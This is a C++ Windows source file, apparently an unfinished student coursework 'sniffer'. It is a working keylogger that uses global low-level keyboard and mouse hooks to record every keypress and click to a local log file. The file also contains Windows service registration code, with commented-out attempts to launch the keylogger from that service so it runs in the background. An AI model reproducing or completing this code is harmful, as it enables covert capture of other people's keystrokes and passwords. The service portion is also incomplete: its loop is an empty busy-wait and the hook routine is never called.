#include <windows.h>
#include <iostream>
#include <string.h>
#include <time.h>
#include <process.h>
#include <stdio.h>
#include <winuser.h>

//СНИФФЕР КУРСАЧ ДОРАБОТАТЬ
//#include <string>
#include <fstream>
using std::cout;

SERVICE_STATUS          wserv_testStatus; 
SERVICE_STATUS_HANDLE   wserv_testStatusHandle; 

std::ofstream out ("SimpleLog.txt", std::ios::out);
std::ofstream out2 ("Statistics.txt", std::ios::out);

struct Keylog{//объявили несколько структур с именами Caps, LShift, RShift и т.д.
    std::string key_name;
    int press_count = 0;
}Caps, LShift, RShift, LCtrl, RCtrl, Insert, Delete, BackSpace, Left, Right, Up, Down, Letter, LMB, RMB, MMove;

LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam){//mouseHookProc CALLBACK функция, которая обрабатывает сообщения, отправленные окну.
    //WPARAM дополнительная информация сообщения. Содержимое этого парметра зависит от значения параметра uMsg
    //LPARAM - дополнительная к сообщению информация. Содержимое этого парметра зависит от значения параметра uMsg
    LMB.key_name = "LeftMouse Button", RMB.key_name = "RightMouse Button", MMove.key_name = "Mouse";
    if (nCode >= 0)
    {
        if (wParam == WM_MOUSEMOVE){
            out << "Mouse Moved" << std::endl;
            MMove.press_count += 1;
        }
        if (wParam == WM_LBUTTONDOWN){
            out << "LMB" << std::endl;
            LMB.press_count++;
        }

        if (wParam == WM_RBUTTONDOWN){
            out << "RMB" << std::endl;
            RMB.press_count++;
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);//это типа такая рекурсия получается что ли...
}
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam){
    auto p = (PKBDLLHOOKSTRUCT) (lParam);
    Caps.key_name = "CapsLock", LShift.key_name = "LSHIFT", RShift.key_name = "RSHIFT", LCtrl.key_name = "LCTRL",
    RCtrl.key_name = "RCTRL", Insert.key_name = "Insert", Delete.key_name = "Delete", BackSpace.key_name = "BackSpace",
    Left.key_name = "Left", Right.key_name = "Right", Up.key_name = "Up", Down.key_name = "Down",
    Letter.key_name = "Letters";
    if(wParam == WM_KEYDOWN){
        switch(p->vkCode){
            case VK_CAPITAL:
                Caps.press_count++;
                out << "<CAPSLOCK>" << std::endl;
                break;
            case VK_LSHIFT:
                LShift.press_count++;
                out << "<LSHIFT>" << std::endl;
                break;
            case VK_RSHIFT:
                RShift.press_count++;
                out << "<RSHIFT>" << std::endl;
                break;
            case VK_LCONTROL:
                LCtrl.press_count++;
                out << "<LCTRL>" << std::endl;
                break;
            case VK_RCONTROL:
                RCtrl.press_count++;
                out << "<RCTRL>" << std::endl;
                break;
            case VK_INSERT:
                Insert.press_count++;
                out << "<INSERT>" << std::endl;
                break;
            case VK_DELETE:
                Delete.press_count++;
                out << "<DEL>" << std::endl;
                break;
            case VK_BACK:
                BackSpace.press_count++;
                out << "<BK>" << std::endl;
                break;
            case VK_LEFT:
                Left.press_count++;
                out << "<LEFT>" << std::endl;
                break;
            case VK_RIGHT:
                Right.press_count++;
                out << "<RIGHT>" << std::endl;
                break;
            case VK_UP:
                Up.press_count++;
                out << "<UP>" << std::endl;
                break;
            case VK_DOWN:
                Down.press_count++;
                out << "<DOWN>" << std::endl;
                break;
            default:
                Letter.press_count++;
                out << char(tolower(p->vkCode)) << std::endl;
                break;
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}
			int WINAPI WinMain2(HINSTANCE hInstance, HINSTANCE hPrevInsance, LPSTR lpCmdLine, int nShowCdm){//короче так запускается виндовская прога

HHOOK keyboardhook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, hInstance, 0);
    //SetWindowsHookEx - устанавливает определенную приложенеим процедуру-крюк(hook) в цепь крюков.
    //Т.о. можно следить за системой или за определёнными типами событий. Эти события ассоциируются либо с определнным типом
    // потока или с потоками на одном компьютере... (как вызывающем потоке?)
HHOOK mousehook = SetWindowsHookEx(WH_MOUSE_LL, mouseHookProc, hInstance, 0);
//WH_MOUSE_LL = 14 - интовая переменная, устанавливающая hook procedure котрая мониторит низкоуровневый ввод мыши. LL - low level
//keyboardHookProc - указатель на hook procedure
//hInstance - HANDLE  для DLL, содержащего hook procedure, указываемую параметром lpfn. hInstance
MessageBox(nullptr, "Press OK to stop", "Menu", MB_OK);
out.close();
if(Caps.press_count) out2 << Caps.key_name << " pressed: " << Caps.press_count << std::endl;
if(LShift.press_count) out2 << LShift.key_name << " pressed: " << LShift.press_count << std::endl;
if(RShift.press_count) out2 << RShift.key_name << " pressed: " << RShift.press_count << std::endl;
if(LCtrl.press_count) out2 << LCtrl.key_name << " pressed: " << LCtrl.press_count << std::endl;
if(RCtrl.press_count) out2 << RCtrl.key_name << " pressed: " << RCtrl.press_count << std::endl;
if(Insert.press_count) out2 << Insert.key_name << " pressed: " << Insert.press_count << std::endl;
if(Delete.press_count) out2 << Delete.key_name << " pressed: " << Delete.press_count << std::endl;
if(BackSpace.press_count) out2 << BackSpace.key_name << " pressed: " << BackSpace.press_count << std::endl;
if(Left.press_count) out2 << Left.key_name << " pressed: " << Left.press_count << std::endl;
if(Right.press_count) out2 << Right.key_name << " pressed: " << Right.press_count << std::endl;
if(Up.press_count) out2 << Up.key_name << " pressed: " << Up.press_count << std::endl;
if(Down.press_count) out2 << Down.key_name << " pressed: " << Down.press_count << std::endl;
if(Letter.press_count) out2 << Letter.key_name << " were typed: " << Letter.press_count << std::endl;
if(LMB.press_count) out2 << LMB.key_name << " pressed: " << LMB.press_count << std::endl;
if(RMB.press_count) out2 << RMB.key_name << " pressed: " << RMB.press_count << std::endl;
if(MMove.press_count) out2 << MMove.key_name << " was moved onto: " << MMove.press_count << " pixels" << std::endl;
out2.close();
return 0;
}

VOID __stdcall CtrlHandler (DWORD Opcode) 
{     
	DWORD status;  
    switch(Opcode)     
	{         
	case SERVICE_CONTROL_PAUSE: 
            wserv_testStatus.dwCurrentState = SERVICE_PAUSED;
			break; 
         case SERVICE_CONTROL_CONTINUE: 
            wserv_testStatus.dwCurrentState = SERVICE_RUNNING; 
            break;          
		 case SERVICE_CONTROL_STOP: 
            wserv_testStatus.dwWin32ExitCode = 0; 
            wserv_testStatus.dwCurrentState  = SERVICE_STOPPED; 
            wserv_testStatus.dwCheckPoint    = 0; 
            wserv_testStatus.dwWaitHint      = 0;  
            if (!SetServiceStatus (wserv_testStatusHandle, 
                &wserv_testStatus))            
			{ 
                status = GetLastError(); 
            }  
            return;          
		 default: 
         	 break;

	}      

    if (!SetServiceStatus (wserv_testStatusHandle,  &wserv_testStatus))     
	{ 
        status = GetLastError(); 
	}     
	return; 
}  

void __stdcall wserv_testStart (DWORD argc, LPTSTR *argv) 
{     
	DWORD status; 

    wserv_testStatus.dwServiceType        = SERVICE_WIN32; 
    wserv_testStatus.dwCurrentState       = SERVICE_START_PENDING; 
    wserv_testStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | 
        SERVICE_ACCEPT_PAUSE_CONTINUE; 
    wserv_testStatus.dwWin32ExitCode      = 0; 
    wserv_testStatus.dwServiceSpecificExitCode = 0; 
    wserv_testStatus.dwCheckPoint         = 0; 
    wserv_testStatus.dwWaitHint           = 0;  
    wserv_testStatusHandle = RegisterServiceCtrlHandler( 
        TEXT("wserv_test"),         CtrlHandler);  
   
	if (wserv_testStatusHandle == (SERVICE_STATUS_HANDLE)0)     
		return;     
	  
    wserv_testStatus.dwCurrentState       = SERVICE_RUNNING; 
    wserv_testStatus.dwCheckPoint         = 0; 
    wserv_testStatus.dwWaitHint           = 0;  
    if (!SetServiceStatus (wserv_testStatusHandle, &wserv_testStatus))     
	{ 
        status = GetLastError(); 
	}  

	FILE* fp;
	SYSTEMTIME stSystemTime;

	while (wserv_testStatus.dwCurrentState!=SERVICE_STOPPED)
	{
		if (wserv_testStatus.dwCurrentState!=SERVICE_PAUSED){
			GetSystemTime(&stSystemTime);
			//fp=fopen("c:\\Test\\serv_log.txt", "a");
			//fprintf(fp,"%d:%d:%d\n",stSystemTime.wHour, stSystemTime.wMinute,
															//stSystemTime.wSecond);
			//fclose(fp);
			
			//MessageBox(nullptr, "Press OK to stop", "Menu", MB_OK);
			//C:\Users\Stepan\source\repos2\CWNZ\cmake-build-debug\CWNZ.exe
			//C:\\Users\\Stepan\\source\\repos2\\CWNZ\\cmake-build-debug\\CWNZ.exe
			//std::string pname = "C:\\Users\\Stepan\\source\\repos2\\CWNZ\\cmake-build-debug\\CWNZ.exe"; 
			//RunProcess(pname.c_str(), INFINITE);
			//FILE *f;
			//f = popen ("C:\\Users\\Stepan\\source\\repos2\\CWNZ\\cmake-build-debug\\CWNZ.exe", "w");
			//if (!f)
			//{
			//perror ("popen");ya tut chota delayu
			//exit(1);
			//}
			//system("C:\\Users\\Stepan\\source\\repos2\\CWNZ\\cmake-build-debug\\CWNZ.exe");
			
			

			
			
			
			
			
			
			
			
			
			
			
 
		}
		//Sleep(5000);
	}

	return; 
} 

int main(int argc, char *argv[])
{
	SERVICE_TABLE_ENTRY   DispatchTable[] =     
	{ 
        { TEXT("wserv_test"), wserv_testStart      }
		,{ NULL,              NULL                }     
	};  
	if (argc>1 && !stricmp(argv[1],"delete"))
	{
		SC_HANDLE scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
		if (!scm) 
		{
			cout<<"Can't open SCM\n";
			exit(1);
		}
		SC_HANDLE svc=OpenService(scm,"wserv_test",DELETE);
		if (!svc)
		{
			cout<<"Can't open service\n";
			exit(2);
		}
		if (!DeleteService(svc))
		{
			cout<<"Can't delete service\n";
			exit(3);
		}
		cout<<"Service deleted\n";
		CloseServiceHandle(svc);
		CloseServiceHandle(scm);

		exit(0);
		
	}
	if (argc>1 && !stricmp(argv[1],"setup"))
	{
		char pname[1024];
		pname[0]='"';
		GetModuleFileName(NULL,pname+1,1023);
		strcat(pname,"\"");
		SC_HANDLE scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE),svc;
		if (!scm) 
		{
			cout<<"Can't open SCM\n";
			exit(1);
		}
		if (!(svc=CreateService(scm,"wserv_test","wserv_test",SERVICE_ALL_ACCESS,
			SERVICE_WIN32_OWN_PROCESS,SERVICE_DEMAND_START,
			SERVICE_ERROR_NORMAL,pname,NULL,NULL,NULL,NULL,NULL)))
		{
			cout<<"Registration error!\n";
			exit(2);
		}
		cout<<"Successfully registered "<<pname<<"\n";
		CloseServiceHandle(svc);
		CloseServiceHandle(scm);
		exit(0);
	}

	if (!StartServiceCtrlDispatcher( DispatchTable))     
	{ 

        
	} 
	return 0;
}